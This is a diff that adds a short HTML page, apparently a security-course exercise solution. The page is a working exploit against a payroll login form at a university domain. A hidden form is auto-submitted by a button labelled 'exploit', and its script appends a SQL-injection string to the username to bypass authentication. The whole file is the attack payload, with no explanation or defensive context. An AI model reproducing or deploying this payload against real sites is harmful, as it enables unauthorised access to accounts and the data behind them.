@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<form action="http://payroll.gatech.edu/index.php" method="POST" onsubmit="" id="Target3">
+<input type="hidden" name="action" value="login" id="action"/>
+<input type="hidden" name="login" value="" id="login"/>
+<input type="hidden" name="password" value="" id="password"/>
+</form>
+<input name="login" id="targetlogin" value="username">
+<button id="exploit" onclick="testt3();">Submit</button>
+
+<script>
+function testt3()
+{
+var targett3 = document.getElementById("targetlogin").value;
+var password = 'pw';
+document.getElementById("password").value = password;
+
+targett3 = targett3 + "'''='";
+document.getElementById("login").value = targett3;
+
+document.getElementById("Target3").submit();
+}
+
+
+</script>
+</body>
+</html>
+
